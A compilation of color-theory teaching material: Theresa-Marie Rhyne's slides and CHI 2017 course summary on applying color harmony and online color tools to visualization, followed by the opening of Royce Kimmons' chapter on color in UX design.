+•Wassily Kandinsky: “Concerning the Spiritual in Art”.
+• Johannes Itten: “The Art of Color: the subjective experience and objective
+rationale of color”.
+• Josef Albers: “The Interaction of Color”.
+NEXT, WE HIGHLIGHT
+SELECTED BAUHAUS TEACHINGS
+OF COLOR THEORY:
+theresamarierhyne@gmail.com30
+30
+•German born American artist & educator.
+Taught at the Bauhaus, eventually immigrating to the
+USA to teach at Black Mountain College & Yale
+University.
+•Created color studies entitled “Homage to
+the Square” for a 25 year period starting
+~1950.
+•In 1963, published “The Interaction of
+Color” detailing his color theories.
+SPECIFIC FOCUS ON JOSEF ALBERS:
+Fair Use Image in the USA taken by Theresa-Marie Rhyne. “Homage to the Square” color studies
+created by Josef Albers and on display at the North Carolina Museum of Art. Copyright by the
+Josef & Anni Albers estate & foundation. http://collection.ncartmuseum.org/collection11/view/
+```
+objects/asitem/People$0040176/4;jsessionid=8A427C773907338158799E73A053A5C7?
+```
+```
+t:state:flow=276f0018-1877-46d0-9c16-6cb0ad65949d.
+```
+theresamarierhyne@gmail.com
+31
+31
+Visualization based on Household Broadband Availability data for the 100 Counties in the
+State of North Carolina from the years of 2002 through 2007. Information and data provided
+by the e-NC Authority.
+CASE STUDY #1: COLORIZING HOUSEHOLD BROADBAND
+AVAILABILITY
+theresamarierhyne@gmail.com32
+32
+The ColorBrewer tool was conceptualized with color schemes by Cynthia A. Brewer with interface design and software
+```
+development by Mark Harrower and others (both in the Department of Geography at Pennsylvania State University).
+```
+```
+See: (http://colorbrewer2.org/).
+```
+USING THE COLORBREWER 2.0 TOOL TO DEVELOP COLORMAPS:
+theresamarierhyne@gmail.com33
+```
+Note: Color Space
+```
+Parameters
+33
+•Sequential Schemes: optimized for
+ordered data from low to high.
+• Diverging Schemes: places equal
+emphasis on mid-range critical
+values as well as extreme values.
+• Qualitative Schemes: does not
+imply magnitude differences and
+suited for representing nominal or
+categorial data.
+COLORBREWER’S COLOR SCHEME CONCEPTS:
+The ColorBrewer tool was conceptualized with color schemes by Cynthia A. Brewer with interface design and software
+```
+development by Mark Harrower and others (both in the Department of Geography at Pennsylvania State University).
+```
+```
+See: (http://colorbrewer2.org/).
+```
+theresamarierhyne@gmail.com34
+34
+Adobe’s Kuler tool allows us to analyze the colors in a JPEG image. We can save the resulting color palettes for future
+work. See: http://kuler.adobe.com/.
+NOW, LET’S USE ADOBE’S KULER TOOL TO ANALYZE THE COLORS
+IN OUR BROADBAND AVAILABILITY VISUALIZATION:
+theresamarierhyne@gmail.com35
+35
+36
+WITH ADOBE’S KULER TOOL, WE OBTAIN COLOR VALUES AND POSSIBLE
+COLOR RELATIONSHIPS:
+ComplementaryAnalogousAccented Analogous
+theresamarierhyne@gmail.com
+```
+Note: Color Space
+```
+Parameters
+36
+Visualization based on a Hurricane Katrina model run at 2 kilometer grid resolution using
+```
+the Weather Research Forecast (WRF) model. The animation shows rain isosurfaces, with
+```
+the purple areas being locations of heaviest rainfall. Dark blue areas are land masses.
+CASE STUDY #2: COLORIZING A HURRICANE
+theresamarierhyne@gmail.com37
+37
+• Applying Color Theory to a time series
+animation of Hurricane Katrina.
+• Using Adobe’s Kuler tool to analyze an existing Color Scheme.
+• Working with the Color Brewer tool to build the
+Tropical Storm Animation Color Scheme.
+HERE, WE HIGHLIGHT 3 TOPICS:
+theresamarierhyne@gmail.com38
+38
+Adobe’s Kuler tool allows us to analyze the colors in a JPEG image. We can save the resulting color palettes for future
+work. See: http://kuler.adobe.com/.
+FIRST, LET’S USE ADOBE’S KULER TOOL TO ANALYZE THE COLORS
+IN OUR HURRICANE VISUALIZATION:
+theresamarierhyne@gmail.com39
+39
+40
+WITH ADOBE’S KULER TOOL, WE OBTAIN COLOR VALUES AND POSSIBLE
+COLOR RELATIONSHIPS:
+ComplementaryAnalogous
+theresamarierhyne@gmail.com
+```
+Note: Color Space
+```
+Parameters
+40
+• Establish Color Maps based on flow of Animation Sequences
+rather than Static Image Displays.
+• ColorBrewer tool helps to Mock-Up Color Maps.
+• From the Mock-Up develop the Final Color Maps with the
+```
+visualization & animation tool (VisIt).
+```
+KEY ELEMENTS OF COLOR MAP DESIGN :
+theresamarierhyne@gmail.com41
+41
+The ColorBrewer tool was conceptualized with color schemes by Cynthia A. Brewer with interface design and software
+```
+development by Mark Harrower (both in the Department of Geography at Pennsylvania State University).
+```
+```
+See: (http://www.personal.psu.edu/cab38/ColorBrewer/ColorBrewer.html).
+```
+USING THE COLORBREWER TOOL TO DEVELOP COLORMAPS:
+theresamarierhyne@gmail.com42
+```
+Note: Color Space
+```
+Parameters
+42
+Visualization programming by Steve Chall with Colorization executed by Theresa-Marie Rhyne at RENCI@NCSU. Created
+```
+in the VisIt open source visualization tool from weather model data based on Hurricane Katrina, see: (http:www.llnl.gov/
+```
+```
+VisIt).
+```
+FRAME FROM ANIMATION SEQUENCE SHOWING COLOR MAPS:
+theresamarierhyne@gmail.com43
+43
+Using Color Scheme Designer, we see that our hurricane colors form an analogous color scheme of Magenta, Purple
+and Blue. Our wind vectors, in Orange, from a complementary color scheme to our Blue ocean background.
+A COLOR SCHEME ANALYSIS OF OUR HURRICANE
+theresamarierhyne@gmail.com44
+44
+Time series based on Hurricane Katrina model run at a 2 kilometer grid resolution using the Weather Research Forecast
+```
+(WRF) model. The animation shows rain isosurfaces, with the purple areas being locations of heaviest rainfall. Dark blue
+```
+areas are land masses.
+SNAPSHOT OF ANIMATION SEQUENCE EVOLVING
+IN A NON-LINEAR EDITING SYSTEM:
+theresamarierhyne@gmail.com45
+45
+Using tiled scatter plot displays
+with complementary color
+schemes, coordinated patterns
+of correlation and anti-
+correlation are visible.
+```
+Reference: “Visualizing Global
+```
+Correlation in Large-Scale
+Molecular Biological Data”,
+A.N.M. Imroz Choudhury, Kristin
+Potter, Theresa-Marie Rhyne,
+Yarden Livnat, Chris R. Johnson,
+and Olry Alter, Scientific
+Computing and Imaging
+Institute, University of Utah,
+a poster presentation at
+BioVis 2011.
+CASE STUDY #3: VISUALIZING CORRELATION IN MOLECULAR
+BIOLOGICAL DATA
+theresamarierhyne@gmail.com46
+46
+•Selecting Complementary Color Schemes with
+Adobe’s Kuler Tool.
+• Verifying Color Blindness Concerns with Vischeck.
+HERE, WE HIGHLIGHT 2 TOPICS:
+theresamarierhyne@gmail.com
+47
+47
+• Complementary Schemes:
+Colors opposite each other on
+the Color Wheel
+• Creates high contrast to
+designate correlation and anti-
+correlation variables.
+• Here, we show traditional
+color maps used in biological
+research.
+• Adobe’s Kuler tool is used to
+help create color schemes,
+```
+see: (http://kuler.adobe.com/).
+```
+TESTING COMPLEMENTARY COLORS SCHEMES:
+theresamarierhyne@gmail.com
+48
+48
+• 3 types of Color Blindness:
+Deuteranope, Protanope,
+Tritanope.
+• Use Vischeck simulations to
+evaluate results.
+```
+(http://www.vischeck.com)
+```
+• Here, we show results for
+the red-green color scheme.
+Deuteranope and Protanope
+are most sensitive to these
+color schemes.
+MUTED COLOR SCHEMES TO ADDRESS COLOR BLIND ISSUES:
+theresamarierhyne@gmail.com
+49
+49
+• 3 types of Color Blindness:
+Deuteranope, Protanope,
+Tritanope.
+• Use Vischeck simulations to
+evaluate results.
+```
+(http://www.vischeck.com)
+```
+• Here, we show results for
+the blue - yellow color
+scheme.
+Tritanope is most sensitive to
+these color schemes.
+MUTED COLOR SCHEMES TO ADDRESS COLOR BLIND ISSUES:
+theresamarierhyne@gmail.com
+50
+50
+• 3 types of Color Blindness: Deuteranope, Protanope, Tritanope.
+• Use Vischeck simulations to evaluate results.
+```
+(http://www.vischeck.com)
+```
+• Here, we show results for the blue - red color scheme.
+ALTERNATIVE COLOR SCHEME: BLUE-RED COLORS
+theresamarierhyne@gmail.com
+51
+51
+• 3 types of Color Blindness: Deuteranope, Protanope, Tritanope.
+• Use Vischeck simulations to evaluate results.
+```
+(http://www.vischeck.com)
+```
+• Here, we show results for the green - purple color scheme.
+CONTRASTING COLOR SCHEME: GREEN-PURPLE COLORS
+theresamarierhyne@gmail.com
+52
+52
+SELECTED COMPLEMENTARY COLORS SCHEME:
+theresamarierhyne@gmail.com
+53
+Adobe’s Kuler tool was used to help establish the color schemes for this work .
+```
+See: (http://kuler.adobe.com/).
+```
+53
+Visualization based on astrophysics data of a supernova shock wave. The computational
+model was executed on a high performance computer and visualized with CEI’s Ensight
+Visualization software.
+```
+(http://www.ensight.com)
+```
+CASE STUDY #4: COLORIZING A SUPERNOVA
+theresamarierhyne@gmail.com54
+54
+•Building the analogous and complementary color schemes with
+Color Scheme Designer.
+• Using Adobe’s Kuler tool to analyze an existing Color Scheme.
+HERE, WE HIGHLIGHT 2 TOPICS:
+theresamarierhyne@gmail.com
+55
+55
+•Analogous Colors
+are color adjacent to
+each other on the
+Color Wheel.
+• Color Scheme
+Designer has an
+“Analogic” option to
+help select analogous
+colors.
+BUILDING ANALOGOUS COLORS:
+theresamarierhyne@gmail.com
+56
+56
+•Complementary
+Colors are color
+across each other on
+the Color Wheel.
+• Color Scheme
+Designer has an
+“Complement” option
+to help select
+complementary
+colors.
+BUILDING COMPLEMENTARY COLORS:
+theresamarierhyne@gmail.com
+57
+57
+We use the analogous color scheme of Yellow, Green and Blue to colorize our Super Nova object. Next, we use Color
+Scheme designer to find the complementary color to Yellow. Our intent is to emphasize the ring of data values
+surrounding the Super Nova with this complementary color. Color Scheme Designer assists us in showing the
+complementary color to be Blue-Purple.
+COMBINING ANALOGOUS & COMPLEMENTARY COLOR SCHEMES
+theresamarierhyne@gmail.com58
+58
+Adobe’s Kuler tool allows us to analyze the colors in a JPEG image. We can save the resulting color palettes for future
+work. See: http://kuler.adobe.com/.
+NOW, LET’S USE ADOBE’S KULER TOOL TO ANALYZE THE COLORS
+IN OUR SUPERNOVA VISUALIZATION:
+theresamarierhyne@gmail.com59
+59
+60
+WITH ADOBE’S KULER TOOL, WE OBTAIN COLOR VALUES AND POSSIBLE
+COLOR RELATIONSHIPS:
+ComplementaryAnalogous
+theresamarierhyne@gmail.com
+```
+Note: Color Space
+```
+Parameters
+60
+•Adobe’s Kuler Tool: http://kuler.adobe.com/
+• Color Scheme Designer: http://colorschemedesigner.com/
+• Colorbrewer: http://colorbrewer2.org/
+• ColorSchemer Touch: http://www.colorschemer.com/touch_info.php
+HANDS ON WORKSHOP:
+USING ONLINE COLOR TOOLS
+theresamarierhyne@gmail.com
+61
+61
+•Adobe’s Kuler Tool: http://kuler.adobe.com/
+• Color Scheme Designer: http://colorschemedesigner.com/
+• Colorbrewer: http://colorbrewer2.org/
+• ColorSchemer Touch: http://www.colorschemer.com/touch_info.php
+HANDS ON WORKSHOP:
+A DATA VISUALIZATION EXAMPLE
+theresamarierhyne@gmail.com62
+62
+• Register & Establish an account with Adobe
+• Login to Adobe Kuler.
+• Select “Create” Option.
+• Move 5 sensors to select colors.
+• Establish Color Palette.
+• Name Color Palette under “Title”.
+• Save Color Palette.
+USING ADOBE’S KULER TOOL:
+```
+http://kuler.adobe.com/
+```
+theresamarierhyne@gmail.com63
+63
+Adobe’s Kuler tool allows us to analyze the colors in a JPEG image. We can save the resulting color palettes for future
+work. See: http://kuler.adobe.com/.
+VISUAL RESULTS WITH OUR JPEG EXAMPLE:
+theresamarierhyne@gmail.com64
+64
+65
+WITH ADOBE’S KULER TOOL, WE OBTAIN COLOR VALUES AND POSSIBLE
+COLOR RELATIONSHIPS:
+ComplementaryAnalogous? Triad?Actually, Tetrad!
+theresamarierhyne@gmail.com
+```
+Note: Color Space
+```
+Parameters
+65
+• Use Browser to go to Color Scheme Designer Site.
+• Select primary Color Scheme for Project.
+```
+(Our Example uses a Tetrad Scheme)
+```
+• Establish Color Options
+```
+(In our Example: Orange, Yellow, Blue & Green )
+```
+• Select Color List to view selected Colors.
+• Establish & Save Color Palette.
+USING COLOR SCHEME DESIGNER:
+```
+http://colorschemedesigner.com/
+```
+theresamarierhyne@gmail.com66
+66
+The Color Scheme Designer tool allows us to select a color scheme. We can save the resulting color palette for future
+work. See: http://colorschemedesigner.com/.
+VISUAL RESULTS WITH OUR JPEG EXAMPLE:
+theresamarierhyne@gmail.com67
+```
+Note: Hex Triplet
+```
+Parameters
+67
+• Use Browser to go to Colorbrewer Site.
+```
+(Requires Flash Plugin)
+```
+• Select “number of data classes”.
+```
+(Our Example uses 4 data classes)
+```
+• Establish “nature of your data”.
+```
+(In our Example: Diverging )
+```
+• Select “Color Scheme” & view selected Colors.
+• Pick a “Color System” & Save Color Palette.
+USING COLORBREWER:
+```
+http://colorbrewer2.org/
+```
+theresamarierhyne@gmail.com68
+68
+The Colorbrewer tool is optimized for selecting colors for building geographic maps but can be used beyond its original
+intent . We can save the resulting color palette for future work.
+```
+See: http://colorbrewer2.org/.
+```
+VISUAL RESULTS WITH OUR JPEG EXAMPLE:
+theresamarierhyne@gmail.com69
+```
+Note: Color Space
+```
+Parameters
+69
+• Select ColorSchemer App on your iPhone/iPod Touch/iPad.
+```
+(This is a free app from the iTunes online store.)
+```
+• Select + Option to view “Create Palette” Color Wheel Screen.
+• Select PhotoSchemer to begin Photo Import & Select Photos icon.
+• Import Photo from Photo Albums into “Create Palette”.
+• Brush over Photo to select colors & “Create Palette”.
+• Establish & Save Color Palette.
+USING COLORSCHEMER TOUCH:
+```
+http://www.colorschemer.com/touch_info.php
+```
+theresamarierhyne@gmail.com70
+70
+ColorSchemer Touch allows us to analyze the colors in a JPEG image / Photo on our mobile device. We can save the
+resulting color palettes for future work. See: http://www.colorschemer.com/touch_info.php.
+VISUAL RESULTS WITH OUR JPEG EXAMPLE:
+theresamarierhyne@gmail.com71
+71
+•Adobe’s Kuler Tool: http://kuler.adobe.com/
+• Color Scheme Designer: http://colorschemedesigner.com/
+HANDS ON WORKSHOP:
+A GENERAL DIGITAL MEDIA EXAMPLE
+theresamarierhyne@gmail.com72
+72
+• Register & Establish an account with Adobe
+• Login to Adobe Kuler.
+• Select “Create” Option.
+• Move 5 sensors to select colors.
+• Establish Color Palette.
+• Name Color Palette under “Title”.
+• Save Color Palette.
+USING ADOBE’S KULER TOOL:
+```
+http://kuler.adobe.com/
+```
+theresamarierhyne@gmail.com73
+73
+Adobe’s Kuler tool allows us to analyze the colors in a JPEG image. We can save the resulting color palettes for future
+work. See: http://kuler.adobe.com/.
+VISUAL RESULTS WITH OUR JPEG EXAMPLE:
+theresamarierhyne@gmail.com74
+74
+75
+WITH ADOBE’S KULER TOOL, WE OBTAIN COLOR VALUES AND POSSIBLE
+COLOR RELATIONSHIPS:
+Analogous
+theresamarierhyne@gmail.com
+```
+Note: Color Space
+```
+Parameters
+75
+• Use Browser to go to Color Scheme Designer Site.
+• Select primary Color Scheme for Project.
+```
+(Our Example uses an Analogous Scheme)
+```
+• Establish Color Options
+```
+(In our Example: Orange, Red & Pink )
+```
+• Select Color List to view selected Colors.
+• Establish & Save Color Palette.
+USING COLOR SCHEME DESIGNER:
+```
+http://colorschemedesigner.com/
+```
+theresamarierhyne@gmail.com76
+76
+The Color Scheme Designer tool allows us to select a color scheme. We can save the resulting color palette for future
+work. See: http://colorschemedesigner.com/.
+VISUAL RESULTS WITH OUR JPEG EXAMPLE:
+theresamarierhyne@gmail.com77
+77
+• Select ColorSchemer App on your iPhone/iPod Touch/iPad.
+```
+(This is a free app from the iTunes online store.)
+```
+• Select + Option to view “Create Palette” Color Wheel Screen.
+• Select PhotoSchemer to begin Photo Import & Select Photos icon.
+• Import Photo from Photo Albums into “Create Palette”.
+• Brush over Photo to select colors & “Create Palette”.
+• Establish & Save Color Palette.
+USING COLORSCHEMER TOUCH:
+```
+http://www.colorschemer.com/touch_info.php
+```
+theresamarierhyne@gmail.com78
+78
+ColorSchemer Touch allows us to analyze the colors in a JPEG image / Photo on our mobile device. We can save the
+resulting color palettes for future work. See: http://www.colorschemer.com/touch_info.php.
+VISUAL RESULTS WITH OUR JPEG EXAMPLE:
+theresamarierhyne@gmail.com79
+79
+• Additive and Subtractive Color Models.
+• Defining Color Gamut, Spaces and Systems.
+• Selected Artistic Movements related to Color Theory.
+• Case Studies pertaining to Colorizing Visualizations.
+• Hands on Workshop using Online Color Tools.
+IN SUMMARY, WE HIGHLIGHTED
+5 TOPICS IN OUR COURSE:
+theresamarierhyne@gmail.com
+80
+80
+• “A Field Guide to Digital Color” by Maureen Stone
+```
+(http://www.stonesc.com/book/index.htm)
+```
+• “The Interaction of Color” by Josef Albers
+```
+(http://yalepress.yale.edu/yupbooks/book.asp?isbn=9780300115956)
+```
+• My “recently published” Book Chapter:
+```
+(http://theresamarierhyne.com/Theresa-Marie_Rhynes_Viewpoint/
+```
+```
+Color_Theory_Book_Chapter.html)
+```
+OTHER RESOURCES ON COLOR THEORY:
+theresamarierhyne@gmail.com81
+81
+• Thanks for to the ACM SIGGRAPH 2012 Courses Reviewers &
+Committee for accepting my proposal.
+• Thanks to all who attended this session during ACM SIGGRAPH
+2012 in Los Angeles, California.
+• Thanks to many colleagues in visualization & digital media who
+have helped me learn so very much over many years.
+• with much gratitude & appreciation...
+Theresa-Marie Rhyne
+```
+ACKNOWLEDGEMENTS:
+```
+theresamarierhyne@gmail.com82
+82
+
+---
+> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, tdd, vcs]
+
+### 📘 KNOWLEDGE: NEXUS_3027063.3076594.MD
+
+> **VERSION**: v1 | **Last Updated**: 26/05/2026
+
+
+
+Applying Color Theory to Digital Media
+and Visualization
+## Abstract
+We examine the foundations of color theory & how
+these methods apply to building effective digital
+media. We define color harmony & demonstrate the
+application of color harmony to case studies. Case
+studies include historic & new infographics as well as
+time series animations. The Pantone Matching System,
+Munsell Color System and other hue systems are
+reviewed. The features of ColorBrewer,
+Adobe’s Capture CC app,& Josef Albers
+“Interaction of Color” app are examined. We also
+introduce “Gamut Mask” &
+Color Proportions of an Image analysis tools. Our
+course concludes with a hands on session that teaches
+how to use online and mobile apps to successfully
+capture, analyze and store color schemes for future
+use in visual analytics. This includes evaluations for
+color deficiencies using Vizcheck & Coblis. These color
+suggestion tools are available online for your continued
+use in creating new digital media. Please bring small
+JPEG examples of your digital media content for
+performing color analyses during the hands on session.
+## Author Keywords
+## Color Theory, Digital Media, Visualization
+ACM Classification Keywords
+H.5.m. Information interfaces and presentation (e.g.,
+HCI): Miscellaneous
+Permission to make digital or hard copies of part or all of this work
+for personal or classroom use is granted without fee provided that
+copies are not made or distributed for profit or commercial
+advantage and that copies bear this notice and the full citation on the
+first page. Copyrights for third-party components of this work must
+be honored. For all other uses, contact the Owner/Author.
+Copyright is held by the owner/author(s). CHI'17 Extended Abstracts,
+May 06-11, 2017, Denver, CO, USA ACM 978-1-4503-4656-6/17/05.
+http://dx.doi.org/10.1145/3027063.3076594
+Theresa-Marie Rhyne
+## Visualization Consultant
+## Durham, North Carolina 27713,
+## USA
+theresamarierhyne@gmail.com
+Course SummaryCHI 2017, May 6–11, 2017, Denver, CO, USA
+## 1264
+
+## Course
+## Description
+We begin our course with a discussion of the historical
+to present day progression of color models, showing
+the integration of the additive Red, Green, Blue (RGB)
+displays model, the subtractive Cyan, Magenta, Yellow
+and Key Black (CMYK) printers model and the
+subtractive Red, Yellow, Blue (RYB) painters model. We
+demonstrate how the inter-relationships between color
+models influences the process of creating color
+schemes for visual analytics and visualization.
+We then review color gamut, noting that a color gamut
+and color model combine to define a color space. We
+illustrate this with the International Commission on
+Illumination (CIE XYZ) color space and the Munsell
+Color System. We show how perceptual uniformity
+studies challenged principles of CIE XYZ and the
+Munsell Color System. We review the independent
+evolutions of the Pantone Color Matching System within
+the design community and Web Hex color specifications
+for Web page design. Additionally, we discuss the
+development of Hue, Saturation and Value (HSV) in the
+computer graphics community. We also examine the
+features of the online ColorBrewer tool and how to
+apply these concepts in your visual analytics design
+work. We show how online and mobile color
+applications integrate between these various systems.
+The emergence of automated color suggestion and
+color proportion tools are also discussed. We complete
+this section with a review of color harmony principles
+and how to use these concepts effectively in applying
+color theory to  visualization development. This
+includes a demonstration of the Color Gamut Mask tool.
+Case study examples and real time demonstrations are
+included through out the course. After presenting these
+concepts, our course converts to a hands on workshop
+session for gaining experience working with online and
+mobile color scheme tools. We go through the process
+of building and analyzing digital media color maps.We
+address building color blind safe color schemes with
+online tools like Coblis, Colorbrewer, Vischeck and Color
+Scheme Designer.  We end our course with a wrap-up
+discussion and review additional reading for applying
+color theory to digital media and visualization.
+Figure 1: Visual Overview of our Color Theory
+Course. Copyright by Theresa-Marie Rhyne,
+## 2016.
+Figure 2: Examples of Color Analyses Tools covered in
+course. Copyright by Theresa-Marie Rhyne, 2016.
+Course SummaryCHI 2017, May 6–11, 2017, Denver, CO, USA
+## 1265
+
+Outline of Course: Applying Color Theory to
+## Digital Media & Visualization
+I.Introduction & Historical Progression of Color
+## Models (35 Minutes)
+a.Additive Color from Newton to Retina Displays:
+Red, Green, Blue (RGB) Displays Color Model
+b.Subtractive Color from 19th Century to Digital:
+Cyan, Magenta, Yellow and Key Black (CMYK)
+## Printers Color Model
+c.Painters Subtractive as viewed with Pigments: Red,
+Yellow, Blue (RYB) Painters Color Model
+d.   Brief Historical Overview with Visual Examples of
+how Color Theories Evolved - Impact of Color
+Science Writings on Artistic Methods
+(Examples: Newton, Harris, Goethe, Chevreul,
+Runge, Rood, Signac, Seurat and others)
+e.Mobile Examples: Applying Color Theory Knowledge
+to Displays, Printing and Painting
+(e.g. Color Companion on your Mobile Phone,
+Adobe Capture, ColorSnap from Sherwin Williams.)
+II. Defining and Redefining Color Gamut, Color
+Spaces & Color Systems (35 minutes)
+a.Why does Color Gamut + Color Model = Color
+## Space?
+b.How Perceptual Uniformity challenges the
+International Commission on Illumination Color
+Space (Original CIE XYZ and resulting CIELAB
+and CIELUV Color Spaces)
+c.    What is the Munsell Color System?: Munsell DG app
+d.   Forget Perception and Just Print, match color
+Pantone Color Matching! : myPantone App
+e.What about Hue Saturation and Value (HSV) and
+## Web Hex Triplets ?
+f.What is Color Harmony and how to use it
+effectively?  Yurmby Wheel, Gamut Masking
+To o l, ColorBrewer, Adobe Color.
+g.   Understanding Josef Alber's Interaction of Color
+concepts: Interaction of Color iPad app.
+h.What about the emergence of Automated Color
+Suggestion and Color Proportion Systems?
+BREAK (15 minutes)
+III. Case Study Examples of Colorizing (30 minutes)
+a.Monochromatic, Complementary, & Analogous
+Schemes: Historic Infographics & Maps  and
+Current Visual Analytics (Color Companion,
+Colourlovers’ COPASO, Color Scheme
+## Designer).
+b.Applying ColorBrewer & Accented Analogous Color
+## Schemes - Info Vis - Household Broadband
+Availability (ColorBrewer, Adobe Capture app).
+c.Color Deficiency & Munsell Color Concepts:
+Correlation in Molecular Biological Data (Coblis
+for Color Deficiency Evaluation; Munsell Color
+System for Visual Layout of Data)
+IV.Hands on: Analyzing & Modifying with Online
+and Mobile Color Tools (40 minutes)
+a.Color Design and Evaluation tools:  Gamut Masking
+To o l, Adobe Color, Tool, Colour Lovers web
+site,  Color Scheme Designer.
+b.Color Blindness Checks: Coblis, Color Scheme
+Designer, VisCheck.
+c.    Color Advice for Maps: ColorBrewer.
+d.   Mobile Apps for Color Evaluations:  Adobe Capture
+app, Color Companion, myPantone and others.
+V.  Wrap-Up , Other Resources & Concluding
+Remarks (5 minutes)
+a.Applying Color Theory to Digital Media and
+Visualization by Theresa-Marie Rhyne
+b.Interaction of Color by Josef Albers
+c.The Art of Color by Johannes Itten
+d.A Field Guide to Digital Color by Maureen Stone
+Course SummaryCHI 2017, May 6–11, 2017, Denver, CO, USA
+## 1266
+
+About the Instructor
+Theresa-Marie Rhyne has over twenty-five years of
+experience in producing and colorizing visualization and
+visual analytics. She has consulted with the Stanford
+University Visualization Group on a Color Suggestion
+Prototype System, the Center for Visualization at the
+University of California at Davis and the Scientific
+Computing and Imaging Institute at the University of Utah
+on applying color theory to Ensemble Data Visualization.
+Prior to her consulting work, she founded two visualization
+centers: (a) the United States Environmental Protection
+Agency’s Scientific Visualization Center in the 1990s and
+(b) the Center for Visualization and Analytics at North
+Carolina State University in the 2000s. Presently, she has
+written a new book on this subject to be published by the
+Taylor & Francis Group / CRC Press in December2016. A
+video summary of this book is available online.
+Length of Course: 160 minutes
+Level & Intended Audience: Beginners and
+higher, all interested in creating effective and
+compelling digital media and visualizations.
+Presentation Format: Lecture with hands on
+session for using online and mobile color tools. Working
+from attendees’ own laptop and/or mobile devices,
+attendees will be encouraged to conduct real time color
+analyses of JPEG or camera images.
+Figure 3: Examples of Color Harmony covered in course.
+Copyright by Theresa-Marie Rhyne 2016.
+Course SummaryCHI 2017, May 6–11, 2017, Denver, CO, USA
+## 1267
+
+---
+> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, tdd, vcs, api]
+
+### 📘 KNOWLEDGE: NEXUS_3243.MD
+
+> **VERSION**: v1 | **Last Updated**: 26/05/2026
+
+
+
+## 5
+Color Theory in Experience Design
+## Royce Kimmons
+ColorVisual DesignAestheticsEmotion
+Choosing colors is an essential component of UX and LX design that is often either overlooked in design
+coursework and research or that is approached in a non-scientific manner. Yet, colors elicit various emotional
+and physiological reactions from users that are important for designers to understand, and these reactions are
+determined by various factors associated with the colors themselves (e.g., hue, saturation, brightness) as well as
+the cultural and experiential backgrounds of users (e.g., this color reminds me of X). This chapter explains
+essential knowledge about how color technically works, summarizes what research has shown about how color
+choice relates to emotions and learning, and provides guidelines for designers to follow in order to more
+effectively incorporate color into their designs. I then conclude by providing guidance on how to intentionally
+develop and use different types of color schemes to better achieve design goals and to improve user
+experiences.
+## 1. Introduction
+Outside the visual arts, color is rarely discussed by professionals in systematic ways; among UX and LX designers, color
+is generally approached in a strange give-and-take between technical prescription and intuitive preference. For instance,
+the color system outlined in Google’s (n.d.) material design visual language provides precise guidance on how to
+generate a color palette from your primary color, what to use secondary colors for, and what colors are typical for
+specific elements (such as error screens), but it does not provide designers any guidance on what primary color to pick
+in the first place, when to use different types of color palettes (e.g., analogous, complementary, triadic), and why. This is
+likely because, when designing for a corporate client, designers are generally constrained by the preexisting branding
+requirements of the client (e.g., “our brand is periwinkle”) and must work from a particular color starting point when
+making designs.
+But designers must also often counterbalance their own and their clients’ everyday assumptions and receive wisdom
+about color in order to create the best designs for end users and learners. For instance, early in my professional
+experience creating websites for clients, I delivered a mock-up that I thought looked good and met the client’s requests
+perfectly. Frustrated with what he saw, the client furrowed his brow and slowly replied, “Yes, but I need something that
+pops.” This, in turn, frustrated me, because the only explanation he then provided would result in what I thought would
+be a terrible-looking design. “What does ‘pop’ really mean?” I thought. And “How can I fix the design to be something
+that the client likes and something that I’m proud of?” And, perhaps most of all, “How can my client and I communicate
+about color in more meaningful ways?”
+## 103
+
+Beyond this need for designers to meaningfully communicate with clients, color also plays an important affective and
+cognitive role in learners’ experiences. Various studies have shown that color-use influences learner attitudes,
+comprehension, and retention (Gaines & Curry, 2011). Some of these influences are broadly universalizable, others are
+contextual to the learner’s age, gender, or culture, and others are contextual to the subject matter or learning objectives
+being targeted. Furthermore, there might be multiple right or useful ways to use color in a particular design project, and
+inappropriate or ineffective color-use in one project might constitute optimal use in another.
+For these reasons, clear and reliable guidance on the what, how, when, and why of color-use in UX design is difficult to
+come by, and the problem of effective color-use is a prime example of why UX design cannot be approached purely as a
+science nor as an art but as a craft that synergistically merges the two. Toward this end, I will begin in this chapter by
+briefly providing some rudimentary groundwork on the underlying physics of color and its technical representation in
+digital formats. This will give us a common vocabulary for referencing specific aspects of color (e.g., hue vs. tone) as
+well as some technical knowledge necessary for actually using color in UX design scenarios. After this, I will briefly
+explore the science of color-use in UX by summarizing some of the emotional, cognitive, and physiological effects that
+color-use has on learners.
+With this backdrop, I will then address some of the applied aspects of color-use that will influence the craft of UX and
+ongoing research in this area. Specifically, I will explore four guiding considerations of color-use that should be
+addressed in UX — contrast, attention, meaning, and harmony—and then provide guidance on how to use color schemes
+to improve harmony by highlighting five dominant types of color schemes. I will then conclude by providing specific
+craft guidance on using color for UX projects and comment on how this should connect to ongoing UX research.
+- Physics of Color and Technical Use
+We must begin this chapter by reviewing some of the physics of light and color. Color is a visual sensation created in
+the mind of the viewer from differing wavelengths of visible light, ranging from low-frequency reds to high-frequency
+violets. Some color sensations can be produced by a narrow band of wavelengths, but others are produced as multiple
+color wavelengths are mixed. For instance, when all color wavelengths are mixed together, they make white light, which
+is why a dispersive prism can be used to split white light into a rainbow of spectral colors. By putting the primary colors
+of light together, then, white can be created additively, as in Figure 1, and various other colors not even present in the
+rainbow can be created by mixing light wavelengths together, such as red and blue making magenta.
+## 104
+
+## Figure 1
+Additive and Subtractive Color Mixing Models
+For this reason, computer screens and other displays have historically used differing intensities of only three primary
+colors of light: red, green, and blue (RGB). On screens, RGB dots are used in combination to create colors ranging from
+white, when they are at full intensity, to black, when they produce no light, and the millions of color combinations in
+between that are commonly used in movies, games, simulations, images, and websites.
+However, visual media that rely upon physical materials to reflect (r ather than generate) light, such as ink and paint,
+operate from a different model of color mixing. Though mixing a green ray of light and a red ray of light would produce
+yellow light, combining green paint and red paint would produce a dark brown. Such materials rely upon a subtractive
+color model (cf. Figure 1), wherein black is the sum of all colors and white is the absence of all colors.
+Recognizing these two approaches to color mixing is important to understand common notations present in design and
+authoring software. For instance, when creating a website, video game, mobile app, or illustration, RGB notations are
+used, such as rgb(255,255,0) for yellow, wherein each number represents a range of 0 (lowest) to 255 (highest) intensity
+for the primary colors. Hexadecimal notations are also commonly used as a shorthand version of RGB, such as #ffff00,
+wherein the number ranges are converted to a base-16 number system, ranging from 0 to ff, without losing any
+information. When creating print media, on the other hand, CMYK notation is commonly used, such as cmyk(0,0,100,0)
+for yellow, wherein each of the primary colors is represented as a percentage of intensity (0-100%) and black is provided
+as a fourth color mixin, because true black is difficult to make through mixing (in real-world applications, mixing would
